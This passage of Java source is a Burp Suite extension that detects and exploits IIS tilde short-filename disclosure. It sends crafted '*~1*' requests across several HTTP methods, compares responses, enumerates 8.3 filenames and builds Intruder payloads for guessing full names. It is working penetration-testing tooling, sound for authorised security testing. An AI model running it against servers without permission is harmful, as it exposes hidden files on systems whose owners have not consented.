package burp;

import java.io.PrintWriter;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.io.FileOutputStream;
import java.io.File;
import java.io.FileReader;
import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.util.List;
import java.util.Arrays;
import java.util.ArrayList;
import java.util.Map;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.LinkedHashSet;
import java.util.Collections;
import java.net.URL;
import java.net.URLEncoder;
import java.awt.Font;
import java.awt.Color;
import java.awt.Component;
import java.awt.BorderLayout;
import java.awt.GridLayout;
import java.awt.FlowLayout;
import java.awt.event.ActionListener;
import java.awt.event.ActionEvent;
import javax.swing.Timer;
import javax.swing.JSplitPane;
import javax.swing.JTabbedPane;
import javax.swing.JScrollPane;
import javax.swing.JPanel;
import javax.swing.JLabel;
import javax.swing.JButton;
import javax.swing.JTextField;
import javax.swing.JTextPane;
import javax.swing.JCheckBox;
import javax.swing.BoxLayout;
import javax.swing.SwingUtilities;
import javax.swing.SwingConstants;
import javax.swing.BorderFactory;
import javax.swing.border.EmptyBorder;
import javax.swing.border.CompoundBorder;
import javax.swing.JFileChooser;

public class BurpExtender implements IBurpExtender, ITab, IScannerCheck, IIntruderPayloadGeneratorFactory
{
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;

    private final String NAME = "IIS Tilde Enumeration Scanner";
    private final String VERSION = "1.1";
    private final String AUTHOR = "Michele 'cyberaz0r' Di Bonaventura";

    private JTabbedPane mainUI;
    private JButton scanButton;

    private KillableThread tildeEnumScanner = new KillableThread();

    private List<String> intruderPayloads = new ArrayList<String>();

    // extension tab name
    @Override
    public String getTabCaption()
    {
        return "IIS Tilde Enum Scanner";
    }

    // main UI panel
    @Override
    public Component getUiComponent()
    {
        return mainUI;
    }

    // UI setup
    @Override
    public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks)
    {
        // print extension info on loading
        PrintWriter stdout = new PrintWriter(callbacks.getStdout(), true);
        stdout.println(NAME + " v" + VERSION + "\nBy " + AUTHOR);

        this.callbacks = callbacks;
        helpers = callbacks.getHelpers();
        
        // extension name
        callbacks.setExtensionName(NAME);

        // register scanner checks
        callbacks.registerScannerCheck(this);

        // register intruder payload generator (for filename guessing from scan results)
        callbacks.registerIntruderPayloadGeneratorFactory(this);
        
        SwingUtilities.invokeLater(new Runnable() 
        {
            @Override
            public void run()
            {
                // setting up UI divided in 2 tabs: scanner and configuration
                mainUI = new JTabbedPane();

                // setting up configuration tab divided in 2 panels: request panel and configuration panel
                JSplitPane configTab = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);
                configTab.setBorder(new EmptyBorder(20, 20, 20, 20));

                // setting up listener for splitting the configuration tab pane 50:50
                ActionListener splitListener = new ActionListener()
                {
                    @Override
                    public void actionPerformed(ActionEvent e)
                    {
                        configTab.setDividerLocation(.5);
                    }
                };
                Timer t = new Timer(200, splitListener);
                t.setRepeats(false);

                // setting up config panel in configuration tab
                JPanel rightPanel = new JPanel();
                rightPanel.setLayout(new BoxLayout(rightPanel, BoxLayout.Y_AXIS));
                JScrollPane rightScrollPanel = new JScrollPane(rightPanel);
                rightScrollPanel.setBorder(new EmptyBorder(20, 20, 20, 20));

                JPanel confPanel = new JPanel(new GridLayout(27, 1));

                JLabel confTitle = new JLabel("Configuration");
                confTitle.setForeground(new Color(249, 130, 11));
                confTitle.setFont(new Font("Nimbus", Font.BOLD, 16));
                confTitle.setAlignmentX(Component.LEFT_ALIGNMENT);
                confTitle.setBorder(new CompoundBorder(confTitle.getBorder(), new EmptyBorder(10, 10, 10, 10)));
                confPanel.add(confTitle);

                // setting up request panel in configuration tab
                JPanel requestPanel = new JPanel();
                requestPanel.setLayout(new BoxLayout(requestPanel, BoxLayout.Y_AXIS));
                requestPanel.setBorder(new EmptyBorder(20, 20, 20, 20));

                JLabel requestTitle = new JLabel("Request Editor");
                requestTitle.setForeground(new Color(249, 130, 11));
                requestTitle.setFont(new Font("Nimbus", Font.BOLD, 16));
                requestTitle.setAlignmentX(Component.LEFT_ALIGNMENT);
                requestTitle.setBorder(new CompoundBorder(requestTitle.getBorder(), new EmptyBorder(10, 10, 10, 10)));

                // setting up elements in request panel in configuration tab
                JTextPane requestEditor = new JTextPane();
                JScrollPane requestScrollEditor = new JScrollPane(requestEditor);
                requestEditor.setFont(new Font("Courier", 0, 14));
                requestEditor.setBorder(BorderFactory.createLineBorder(Color.BLACK));
                requestEditor.setText
                (
                    "§METHOD§ §PATH§ HTTP/1.1\n" +
                    "Host: §HOST§\n" +
                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\n" +
                    "\n"
                );
                
                requestPanel.add(requestTitle);
                requestPanel.add(requestScrollEditor);

                // setting up elements in config panel in configuration tab
                HashMap<String, JTextField> confFields = new HashMap<String, JTextField>();

                confPanel.add(new JLabel("Magic Final Part List (separated by comma):"));
                confFields.put("magicFinalPartList", new JTextField("\\a.aspx,\\a.asp,/a.aspx,/a.asp,/a.shtml,/a.asmx,/a.ashx,/a.config,/a.php,/a.jpg,/webresource.axd,/a.xxx", 50));
                confPanel.add(confFields.get("magicFinalPartList"));

                confPanel.add(new JLabel("Question Mark Symbol:"));
                confFields.put("questionMarkSymbol", new JTextField("?", 50));
                confPanel.add(confFields.get("questionMarkSymbol"));

                confPanel.add(new JLabel("Asterisk Symbol:"));
                confFields.put("asteriskSymbol", new JTextField("*", 50));
                confPanel.add(confFields.get("asteriskSymbol"));

                confPanel.add(new JLabel("Magic File Name:"));
                confFields.put("magicFileName", new JTextField("*~1*", 50));
                confPanel.add(confFields.get("magicFileName"));

                confPanel.add(new JLabel("Magic File Extension:"));
                confFields.put("magicFileExt", new JTextField("*", 50));
                confPanel.add(confFields.get("magicFileExt"));

                confPanel.add(new JLabel("URL Suffix for error display:"));
                confFields.put("urlSuffix", new JTextField("?&aspxerrorpath=/", 50));
                confPanel.add(confFields.get("urlSuffix"));

                confPanel.add(new JLabel("Request methods (separated by comma):"));
                confFields.put("requestMethods", new JTextField("DEBUG,OPTIONS,GET,POST,HEAD,TRACE", 50));
                confPanel.add(confFields.get("requestMethods"));

                confPanel.add(new JLabel("File Name starts with:"));
                confFields.put("nameStartsWith", new JTextField("", 50));
                confPanel.add(confFields.get("nameStartsWith"));

                confPanel.add(new JLabel("File Extension starts with:"));
                confFields.put("extStartsWith", new JTextField("", 50));
                confPanel.add(confFields.get("extStartsWith"));

                confPanel.add(new JLabel("Max Numerical Part:"));
                confFields.put("maxNumericalPart", new JTextField("10", 50));
                confPanel.add(confFields.get("maxNumericalPart"));

                confPanel.add(new JLabel("Force Numerical Part:"));
                confFields.put("forceNumericalPart", new JTextField("1", 50));
                confPanel.add(confFields.get("forceNumericalPart"));

                confPanel.add(new JLabel("Delta Value for Response Lengths:"));
                confFields.put("deltaResponseLength", new JTextField("10", 50));
                confPanel.add(confFields.get("deltaResponseLength"));

                confPanel.add(new JLabel("In-Scope characters:"));
                confFields.put("inScopeCharacters", new JTextField("ETAONRISHDLFCMUGYPWBVKJXQZ0123456789_-$~()&!#%'@^`{}", 50));
                confPanel.add(confFields.get("inScopeCharacters"));

                JPanel filenameGuessingPanel = new JPanel(new GridLayout(6, 1));

                JLabel filenameGuessingTitle = new JLabel("Complete filename guessing");
                filenameGuessingTitle.setForeground(new Color(249, 130, 11));
                filenameGuessingTitle.setFont(new Font("Nimbus", Font.BOLD, 16));
                filenameGuessingTitle.setAlignmentX(Component.LEFT_ALIGNMENT);
                filenameGuessingTitle.setBorder(new CompoundBorder(confTitle.getBorder(), new EmptyBorder(10, 10, 10, 10)));
                filenameGuessingPanel.add(filenameGuessingTitle);

                JCheckBox completeFileGuessCheckbox = new JCheckBox("Create an Intruder Payload Set with possible filenames (using wordlists)", false);
                filenameGuessingPanel.add(completeFileGuessCheckbox);

                filenameGuessingPanel.add(new JLabel("Complete file name wordlist:"));
                confFields.put("fileNameWordlist", new JTextField("", 50));
                filenameGuessingPanel.add(confFields.get("fileNameWordlist"));

                filenameGuessingPanel.add(new JLabel("Complete file extension wordlist:"));
                confFields.put("fileExtWordlist", new JTextField("", 50));
                filenameGuessingPanel.add(confFields.get("fileExtWordlist"));
                
                rightPanel.add(confPanel);
                rightPanel.add(filenameGuessingPanel);

                // setting up scanner tab
                JSplitPane scannerTab = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
                scannerTab.setBorder(new EmptyBorder(20, 20, 20, 20));

                JPanel scannerTopPanel = new JPanel(new GridLayout(2, 1));
                scannerTopPanel.setBorder(new EmptyBorder(0, 0, 10, 0));

                JPanel scannerBottomPanel = new JPanel(new BorderLayout(10, 10));
                scannerBottomPanel.setBorder(new EmptyBorder(0, 0, 10, 0));

                // setting up elements in scanner tab
                JTextPane textPane = new JTextPane();
                JScrollPane textScrollPane = new JScrollPane(textPane);
                textPane.setFont(new Font("Courier", 0, 12));
                textPane.setText("IIS Tilde Enumeration Scanner Burp Extension is ready\nThe scan output will be displayed here");
                textPane.setEditable(false);

                JPanel moreOptionsPanel = new JPanel(new FlowLayout(FlowLayout.LEADING, 10, 10));

                JCheckBox exploitModeCheckbox = new JCheckBox("Exploit the vulnerability (opt out for only checking)", true);
                moreOptionsPanel.add(exploitModeCheckbox, BorderLayout.LINE_START);

                JButton saveOutputButton = new JButton("Save output to file");
                moreOptionsPanel.add(saveOutputButton);

                moreOptionsPanel.add(new JLabel("          Status: ", SwingConstants.LEFT), BorderLayout.CENTER);
                JLabel statusLabel = new JLabel("Ready to scan", SwingConstants.LEFT);
                moreOptionsPanel.add(statusLabel);

                JPanel barPanel = new JPanel(new FlowLayout(FlowLayout.LEADING, 10, 10));

                barPanel.add(new JLabel("Target URL:", SwingConstants.LEFT), BorderLayout.LINE_START);
                JTextField targetUrlField = new JTextField("", 50);
                barPanel.add(targetUrlField);

                barPanel.add(new JLabel("Number of threads:", SwingConstants.LEFT), BorderLayout.CENTER);
                JTextField nThreadsField = new JTextField("20", 3);
                barPanel.add(nThreadsField);

                scanButton = new JButton("Scan");
                scanButton.setBackground(new Color(249, 130, 11));
                scanButton.setForeground(Color.WHITE);
                scanButton.setFont(new Font("Nimbus", Font.BOLD, 12));
                barPanel.add(scanButton);
                
                // setting up action listener for starting scan button
                scanButton.addActionListener
                (
                    new StartScanButton
                    (
                        targetUrlField,
                        textPane,
                        confFields,
                        nThreadsField,
                        exploitModeCheckbox,
                        completeFileGuessCheckbox,
                        requestEditor,
                        statusLabel
                    )
                );

                // setting up action listener for saving output button
                saveOutputButton.addActionListener
                (
                    new ActionListener()
                    {
                        public void actionPerformed(ActionEvent a)
                        {
                            saveOutputToFile(textPane, targetUrlField);
                        }
                    }
                );

                // building UI
                scannerTopPanel.add(barPanel);
                scannerTopPanel.add(moreOptionsPanel);
                scannerBottomPanel.add(textScrollPane, BorderLayout.CENTER);

                scannerTab.setTopComponent(scannerTopPanel);
                scannerTab.setBottomComponent(scannerBottomPanel);

                configTab.setTopComponent(requestPanel);
                configTab.setBottomComponent(rightScrollPanel);

                t.start(); // triggering listener for splitting config tab 50:50

                callbacks.customizeUiComponent(scannerTab);
                callbacks.customizeUiComponent(configTab);

                mainUI.addTab("Scanner", scannerTab);
                mainUI.addTab("Configuration", configTab);
                
                callbacks.addSuiteTab(BurpExtender.this);
            }
        });
    }

    private void toggleScanButton(boolean isScanning)
    {
        if(isScanning)
        {
            scanButton.setBackground(null);
            scanButton.setForeground(null);
            scanButton.setFont(null);
            scanButton.setText("Stop");
        }
        else
        {
            scanButton.setBackground(new Color(249, 130, 11));
            scanButton.setForeground(Color.WHITE);
            scanButton.setFont(new Font("Nimbus", Font.BOLD, 12));
            scanButton.setText("Scan");
        }
    }

    private void saveOutputToFile(JTextPane textPane, JTextField targetUrlField)
    {
        // get output content
        byte[] output = textPane.getText().getBytes();

        // build filename string
        String filename =
            "Burp_IIS_Tilde_Scan_" +
            targetUrlField.getText().replace("http://", "").replace("https://", "").replace("/", "_").split("\\?")[0] +
            "_" + Long.toString(System.currentTimeMillis() / 1000L) + ".txt";
                            
        // show save file dialog
        final JFileChooser fc = new JFileChooser();
        fc.setSelectedFile(new File(filename));

        if (fc.showSaveDialog(null) == JFileChooser.APPROVE_OPTION)
        {
            // write file
            try
            {
                FileOutputStream fos = new FileOutputStream(fc.getSelectedFile());
                fos.write(output);
                fos.close();
            }
            catch (IOException e)
            {
                // write exception to error tabs
                PrintWriter stderr = new PrintWriter(callbacks.getStderr(), true);
                stderr.println(e.toString());
            }
        }
    }
    
    public boolean checkExistingIssue(IScanIssue newIssue)
    {
        for (IScanIssue existingIssue : callbacks.getScanIssues(newIssue.getUrl().toString()))
        {
            if (existingIssue.getIssueName().equals(newIssue.getIssueName()))
            {
                return true;
            }
        }

        return false;
    }

    @Override
    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue)
    {
        if
        (
            existingIssue.getIssueName().equals(newIssue.getIssueName()) &&
            existingIssue.getUrl().toString().equals(newIssue.getUrl().toString())
        )
        {
            return -1;
        }
        else
        {
            return 0;
        }
    }

    // active scan: check for vulnerability by testing default hardcoded values, for advanced check and exploitation there's the GUI scanner
    @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint)
    {
        // initializing vars
        ArrayList<IScanIssue> result = new ArrayList<IScanIssue>();
        Requester requester = new Requester(baseRequestResponse, baseRequestResponse.getHttpService());
        String[] reqLines = new String(baseRequestResponse.getRequest()).split("\r\n");
        String[] firstLine = reqLines[0].split(" ");
        String basePath = (firstLine[1].endsWith("/")) ? firstLine[1].substring(0, firstLine[1].length() - 1) : firstLine[1];
        String baseRequest = "§METHOD§ §PATH§ " + String.join(" ", Arrays.copyOfRange(firstLine, 2, firstLine.length)) + "\r\n" + String.join("\r\n", Arrays.copyOfRange(reqLines, 1, reqLines.length));

        // looping through hardcoded request methods and magic final parts
        for (String  magicFinalPart : "\\a.aspx,\\a.asp,/a.aspx,/a.asp,/a.shtml,/a.asmx,/a.ashx,/a.config,/a.php,/a.jpg,/webresource.axd,/a.xxx".split(","))
        {
            for (String requestMethod : "DEBUG,OPTIONS,GET,POST,HEAD,TRACE".split(","))
            {
                String validName = basePath + "/" + Utils.urlEncode("*~1*" + magicFinalPart);
                String invalidName = basePath + "/1234567890" + Utils.urlEncode("*~1*" + magicFinalPart);
                String invalidDifferentName = basePath + "/0123456789" + Utils.urlEncode("*~1.*" + magicFinalPart);

                // valid name
                IHttpRequestResponse validNameRequest = requester.httpRequestRaw(baseRequest.replace("§METHOD§", requestMethod).replace("§PATH§", validName));
                String validNameResponse = stripResponse(new String(validNameRequest.getResponse()), validName, "");

                // invalid name
                IHttpRequestResponse invalidNameRequest = requester.httpRequestRaw(baseRequest.replace("§METHOD§", requestMethod).replace("§PATH§", invalidName));
                String invalidNameResponse = stripResponse(new String(invalidNameRequest.getResponse()), invalidName, "");

                // checking for differences between valid and invalid filenames in status, content and content length
                if
                (
                    !validNameResponse.equals(invalidNameResponse) &&
                    !Utils.checkDelta(validNameResponse.length(), invalidNameResponse.length(), 10)
                )
                {
                    String invalidDifferentNameResponse = stripResponse(requester.httpRequest(baseRequest.replace("§METHOD§", requestMethod).replace("§PATH§", invalidDifferentName)), invalidDifferentName, "");
                    
                    // if two different invalid requests lead to different responses, we cannot rely on them unless their length difference is negligible!
                    if
                    (
                        invalidDifferentNameResponse.equals(invalidNameResponse) ||
                        Utils.checkDelta(invalidDifferentNameResponse.length(), invalidNameResponse.length(), 10)
                    )
                    {
                        // host is vulnerable, adding issue if not present
                        IHttpRequestResponse[] vulnerableRequests = {validNameRequest, invalidNameRequest};
                        String vulnerableUrl = baseRequestResponse.getHttpService().getProtocol() + "://" + baseRequestResponse.getHttpService().getHost() + basePath;
                        
                        CustomScanIssue issue = new CustomScanIssue(requester.getHttpService(), vulnerableUrl, vulnerableRequests);
                        if (!checkExistingIssue(issue))
                        {
                            result.add(issue);
                            return result;
                        }
                        else
                        {
                            return null;
                        }
                    }
                }
            }
        }
        
        return null;
    }
    
    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse)
    {
        return null;
    }
    
    @Override
    public String getGeneratorName()
    {
        return "Filename guessing from Tilde Enumeration scan results";
    }

    @Override
    public IIntruderPayloadGenerator createNewInstance(IIntruderAttack attack)
    {
        return new IntruderPayloadGenerator(intruderPayloads);
    }

    // strip response data in order to get more granular results
    public String stripResponse(String response, String basePath, String queryString)
    {
        // split headers and body
        String[] responseSplitted = response.split("\r\n\r\n");

        // if body is empty return only first header
        if (responseSplitted.length < 2)
        {
            return responseSplitted[0].split("\r\n")[0];
        }

        // strip body
        response = responseSplitted[1].toLowerCase().replaceAll("(?im)([\\\\])", "/").replaceAll("(?im)&amp;", "&").replaceAll("(?im)([\\(\\)\\.\\*\\?])", "");
        
        // remove incoming data + even url encoded format
        String remove = basePath + "/" + Utils.urlEncode(basePath) + "/?" + queryString;
        remove = remove.toLowerCase().replaceAll("(?im)([\\\\])", "/").replaceAll("(?im)&amp;", "&").replaceAll("(?im)([\\(\\)\\.\\*\\?])", "");
        
        // remove a tag when it includes dynamic contents
        String[] temp = remove.split("/");
        for (int i = 0; i < temp.length; i++)
        {
            if (temp[i].length() > 0)
            {
                while (response.indexOf(temp[i]) > 0)
                {
                    response = response.replaceAll("(?im)(\\<[^>]+[a-z0-9\\-]=['\"`]([^\"]*" + temp[i] + "[^\"]*)['\"`][^>]*>)", "");
                    response = response.replace(temp[i], "");
                }
            }
        }

        // remove nonce attributes
        response = response.replaceAll("nonce=\"[a-zA-Z0-9]*\"", "");
        
        // return first header + stripped body
        return responseSplitted[0].split("\r\n")[0] + response.replaceAll("(?im)(([\\n\\r\\x00]+)|((server error in).+>)|((physical path).+>)|((requested url).+>)|((handler<).+>)|((notification<).+>)|(\\://[a-zA-Z0-9\\-\\.]+\\.[a-zA-Z]{2,3}(/\\S*)?)|(<!--[\\w\\W]*?-->)|((content-type)[\\s\\:\\=]+[\\w \\d\\=\\[\\,\\:\\-\\/\\;]*)|((length)[\\s\\:\\=]+[\\w \\d\\=\\[\\,\\:\\-\\/\\;]*)|((tag|p3p|expires|date|age|modified|cookie)[\\s\\:\\=]+[^\\r\\n]*)|([\\:\\-\\/\\ ]\\d{1,4})|(: [\\w\\d, :;=/]+\\W)|(^[\\w\\d, :;=/]+\\W$)|(\\d{1,4}[\\:\\-\\/\\ ]\\d{1,4}))", "");
    }

    // config options class
    class CustomConfig
    {
        private List<String> magicFinalPartList;
        private List<String> requestMethods;
        private List<String> scanList;
        private String requestString;
        private String questionMarkSymbol;
        private String asteriskSymbol;
        private String magicFileName;
        private String magicFileExt;
        private String urlSuffix;
        private String nameStartsWith;
        private String extStartsWith;
        private int maxNumericalPart;
        private int forceNumericalPart;
        private int deltaResponseLength;
        private int nThreads;
        private boolean exploitMode;
        private boolean completeFileGuess;
        private File fileNameWordlist;
        private File fileExtWordlist;

        public CustomConfig(HashMap<String, JTextField> confFields, JTextPane requestEditor, JTextField nThreadsField, JCheckBox exploitModeCheckbox, JCheckBox completeFileGuessCheckbox)
        {
            this.magicFinalPartList = Arrays.asList(confFields.get("magicFinalPartList").getText().split(","));
            this.questionMarkSymbol = confFields.get("questionMarkSymbol").getText();
            this.asteriskSymbol = confFields.get("asteriskSymbol").getText();
            this.magicFileName = confFields.get("magicFileName").getText();
            this.magicFileExt = confFields.get("magicFileExt").getText();
            this.urlSuffix = confFields.get("urlSuffix").getText();
            this.requestMethods = Arrays.asList(confFields.get("requestMethods").getText().split(","));
            this.nameStartsWith = confFields.get("nameStartsWith").getText();
            this.extStartsWith = confFields.get("extStartsWith").getText();
            this.maxNumericalPart = Integer.parseInt(confFields.get("maxNumericalPart").getText());
            this.forceNumericalPart = Integer.parseInt(confFields.get("forceNumericalPart").getText());
            this.deltaResponseLength = Integer.parseInt(confFields.get("deltaResponseLength").getText());
            this.scanList = Arrays.asList(confFields.get("inScopeCharacters").getText().split(""));
            this.requestString = requestEditor.getText();
            this.nThreads = Integer.parseInt(nThreadsField.getText());
            this.exploitMode = exploitModeCheckbox.isSelected();
            this.completeFileGuess = completeFileGuessCheckbox.isSelected();
            this.fileNameWordlist = new File(confFields.get("fileNameWordlist").getText());
            this.fileExtWordlist = new File(confFields.get("fileExtWordlist").getText());
        }
        
        public List<String> getMagicFinalPartList()
        {
            return this.magicFinalPartList;
        }
        
        public List<String> getRequestMethods()
        {
            return this.requestMethods;
        }
        
        public List<String> getScanList()
        {
            return this.scanList;
        }
        
        public String getRequestString()
        {
            return this.requestString;
        }
        
        public String getQuestionMarkSymbol()
        {
            return this.questionMarkSymbol;
        }
        
        public String getAsteriskSymbol()
        {
            return this.asteriskSymbol;
        }
        
        public String getMagicFileName()
        {
            return this.magicFileName;
        }
        
        public String getMagicFileExt()
        {
            return this.magicFileExt;
        }
        
        public String getUrlSuffix()
        {
            return this.urlSuffix;
        }
        
        public String getNameStartsWith()
        {
            return this.nameStartsWith;
        }
        
        public String getExtStartsWith()
        {
            return this.extStartsWith;
        }
        
        public int getMaxNumericalPart()
        {
            return this.maxNumericalPart;
        }
        
        public int getForceNumericalPart()
        {
            return this.forceNumericalPart;
        }
        
        public int getDeltaResponseLength()
        {
            return this.deltaResponseLength;
        }
        
        public int getNThreads()
        {
            return this.nThreads;
        }
        
        public boolean getExploitMode()
        {
            return this.exploitMode;
        }
        
        public boolean getCompleteFileGuess()
        {
            return this.completeFileGuess;
        }
        
        public File getFileNameWordlist()
        {
            return this.fileNameWordlist;
        }
        
        public File getFileExtWordlist()
        {
            return this.fileExtWordlist;
        }

        public void setQuestionMarkSymbol(String questionMarkSymbol)
        {
            this.questionMarkSymbol = questionMarkSymbol;
        }
    }

    // output class
    class CustomOutput
    {
        private PrintWriter stdout;
        private PrintWriter stderr;
        private JLabel statusLabel;
        private JTextPane outputPanel;
        private String output;

        public CustomOutput(JTextPane outputPanel, JLabel statusLabel)
        {
            this.stdout = new PrintWriter(callbacks.getStdout(), true);
            this.stderr = new PrintWriter(callbacks.getStderr(), true);
            this.statusLabel = statusLabel;
            this.outputPanel = outputPanel;
            this.output = "";
        }

        public void print(String outString)
        {
            this.output = output + outString + "\n";
            outputPanel.setText(output);
            outputPanel.setCaretPosition(outputPanel.getDocument().getLength());
        }

        public synchronized void print_stdout(String out)
        {
            stdout.println(out);
        }
        
        public synchronized void status(String currentStatus)
        {
            statusLabel.setText(currentStatus);
        }

        public void print_stderr(String err)
        {
            stderr.println(err);
        }

        public void print_alert(String alert)
        {
            callbacks.issueAlert(alert);
        }
    }

    // action listener class for triggering scan on button click
    class StartScanButton implements ActionListener
    {
        private JTextField targetUrlField;
        private JTextPane textPane;
        private HashMap<String, JTextField> confFields;
        private JTextField nThreadsField;
        private JCheckBox exploitModeCheckbox;
        private JCheckBox completeFileGuessCheckbox;
        private JTextPane requestEditor;
        private JLabel statusLabel;

        public StartScanButton(JTextField targetUrlField, JTextPane textPane, HashMap<String, JTextField> confFields, JTextField nThreadsField, JCheckBox exploitModeCheckbox, JCheckBox completeFileGuessCheckbox, JTextPane requestEditor, JLabel statusLabel)
        {
            super();
            this.targetUrlField = targetUrlField;
            this.textPane = textPane;
            this.confFields = confFields;
            this.nThreadsField = nThreadsField;
            this.exploitModeCheckbox = exploitModeCheckbox;
            this.completeFileGuessCheckbox = completeFileGuessCheckbox;
            this.requestEditor = requestEditor;
            this.statusLabel = statusLabel;
        }

        private boolean checkValidConfig()
        {
            // handle invalid value for thread numbers
            try
            {
                Integer.parseInt(nThreadsField.getText());
            }
            catch (Exception e)
            {
                textPane.setText("[X] Error: number of thread should be an integer value");
                return false;
            }

            // handle invalid value for delta response length
            try
            {
                Integer.parseInt(confFields.get("deltaResponseLength").getText());
            }
            catch (Exception e)
            {
                textPane.setText("[X] Error: delta response length should be an integer value");
                return false;
            }
            

            // handle invalid value for max numerical part
            try
            {
                Integer.parseInt(confFields.get("maxNumericalPart").getText());
            }
            catch (Exception e)
            {
                textPane.setText("[X] Error: max numerical part should be an integer value");
                return false;
            }

            // handle invalid value for force numerical part
            try
            {
                Integer.parseInt(confFields.get("forceNumericalPart").getText());
            }
            catch (Exception e)
            {
                textPane.setText("[X] Error: force numerical part should be an integer value");
                return false;
            }

            // all valid values, check passed
            return true;
        }

        public void actionPerformed(ActionEvent e)
        {
            // check if a scan is already running, and stop it in case
            if (tildeEnumScanner.isAlive())
            {
                tildeEnumScanner.kill();
                toggleScanButton(false);
                statusLabel.setText("Scan interrupted");
            }
            else if(checkValidConfig())
            {
                toggleScanButton(true);
                statusLabel.setText("Scan in progress");

                tildeEnumScanner = new TildeEnumScanner
                (
                    targetUrlField.getText(),
                    new CustomConfig(confFields, requestEditor, nThreadsField, exploitModeCheckbox, completeFileGuessCheckbox),
                    new CustomOutput(textPane, statusLabel)
                );
                tildeEnumScanner.start();
            }
        }
    }

    // requester class to handle HTTP requests and responses
    class Requester
    {
        private IHttpService httpService;
        private String hostname;
        private String basePath;
        private String queryString;
        private int reqCounter;

        public Requester(String targetUrl)
        {
            // initialize request counter
            reqCounter = 0;

            // extract request information from URL string
            String hostname = targetUrl.split("://")[1].split("\\?")[0].split("/")[0];
            boolean useHttps = targetUrl.substring(0, 5).equals("https");
            int port = (hostname.indexOf(":") != -1) ? Integer.parseInt(hostname.split(":")[1]) : ((useHttps) ? 443 : 80);
            
            this.hostname = hostname;
            this.basePath = parseBasePath(targetUrl.split("://")[1].replace(hostname, "").split("\\?")[0]);
            this.queryString = (targetUrl.indexOf('?') != -1) ? "?" + targetUrl.split("\\?")[1] : "";
            
            // initialize IHttpService object
            this.httpService = helpers.buildHttpService(hostname.split(":")[0], port, useHttps);
        }

        public Requester(IHttpRequestResponse baseRequestResponse, IHttpService httpService)
        {
            this.httpService = httpService;

            // extract hostname, base path and querystring from request in IHttpRequestResponse object
            String[] request = new String(baseRequestResponse.getRequest()).split("\r\n");
            String[] pathAndQuerystring = request[0].split(" ")[1].split("\\?", 2);
            this.queryString = (pathAndQuerystring.length > 1) ? "?" + pathAndQuerystring[1] : "";
            this.basePath = parseBasePath(pathAndQuerystring[0]);
            this.hostname = request[1].split("Host: ")[1];
        }

        public IHttpService getHttpService()
        {
            return this.httpService;
        }

        public String getQueryString()
        {
            return this.queryString;
        }

        public String getBasePath()
        {
            return (basePath.equals("/")) ? "" : basePath;
        }

        public int getReqCounter()
        {
            return this.reqCounter;
        }

        private String parseBasePath(String basePath)
        {
            // in case an URL with no slash is provided
            if (basePath.equals(""))
            {
                return "/";
            }

            // strip last slash character
            else if (basePath.endsWith("/"))
            {
                return basePath.substring(0, basePath.length() - 1);
            }

            return basePath;
        }

        public IHttpRequestResponse httpRequestRaw(String requestString)
        {
            try
            {
                //increment request counter
                this.reqCounter++;

                // initialize request byte array
                byte[] request = requestString.replace("§HOST§", hostname).getBytes();

                // parse request headers and body from text
                IRequestInfo requestInfo = helpers.analyzeRequest(request);
                List<String> headers = requestInfo.getHeaders();
                byte[] body = Arrays.copyOfRange(request, requestInfo.getBodyOffset(), request.length);
                
                // build request
                request = helpers.buildHttpMessage(headers, body);
                
                // send request
                IHttpRequestResponse requestResponse = callbacks.makeHttpRequest(httpService, request);

                // return request object
                return requestResponse;
            }
            catch (RuntimeException e)
            {
                throw new RuntimeException("connection error");
                //throw new RuntimeException(e.toString());
            }
        }

        public String httpRequest(String requestString)
        {
            return new String(httpRequestRaw(requestString).getResponse());
        }
    }

    // scanner class
    class TildeEnumScanner extends KillableThread
    {
        private ThreadPool initThreadPool;
        private ThreadPool bruteThreadPool;

        private String targetUrl;
        private CustomOutput output;
        private CustomConfig config;
        private Requester requester;

        private String requestMethod;
        private String magicFinalPart;
        private String validStatusMessage;
        private boolean extensionGuessable;
        private boolean questionMarkReliable;
        
        private HashMap<String, String> invalidStatusMessages;

        public TildeEnumScanner(String targetUrl, CustomConfig config, CustomOutput output)
        {
            super();

            this.targetUrl = targetUrl;
            this.output = output;
            this.config = config;

            invalidStatusMessages = new HashMap<String, String>();
            initThreadPool = new ThreadPool(config.getNThreads());
            bruteThreadPool = new ThreadPool(config.getNThreads());
        }

        @Override
        public void kill()
        {
            initThreadPool.close();
            bruteThreadPool.close();
            output.print("[-] Scan interrupted by user");
            super.kill();
        }
        
        @Override
        public void run()
        {
            try
            {
                // checking for valid URL
                if
                (
                    targetUrl.length() < 8 ||
                    (
                        !targetUrl.substring(0, 7).equals("http://") &&
                        !targetUrl.substring(0, 8).equals("https://")
                    )
                )
                {
                    output.print("[X] Error: invalid URL \"" + targetUrl + "\"");
                    output.status("Ready to scan");
                    toggleScanButton(false);
                    return;
                }

                // checking for correct number of threads
                if (config.getNThreads() < 1 || config.getNThreads() > 50)
                {
                    output.print("[X] Error: number of threads must be between 1 and 50");
                    output.status("Ready to scan");
                    toggleScanButton(false);
                    return;
                }
                
                // checking for correct request format
                if (!config.getRequestString().endsWith("\n\n"))
                {
                    output.print("[X] Error: request format is incorrect");
                    output.status("Ready to scan");
                    toggleScanButton(false);
                    return;
                }

                // checking for filename and extension startswith correct length
                if (config.getNameStartsWith().length() > 6)
                {
                    output.print("[X] Error: shortnames can start with 6 characters maximum");
                    output.status("Ready to scan");
                    toggleScanButton(false);
                    return;
                }

                if (config.getExtStartsWith().length() > 3)
                {
                    output.print("[X] Error: shortname extensions can start with 3 characters maximum");
                    output.status("Ready to scan");
                    toggleScanButton(false);
                    return;
                }
                
                // checking for complete guessing wordlist files existence (if complete filename guessing is enabled)
                if (config.getCompleteFileGuess())
                {
                    if(!(config.getFileNameWordlist().exists()) || !(config.getFileExtWordlist().exists()))
                    {
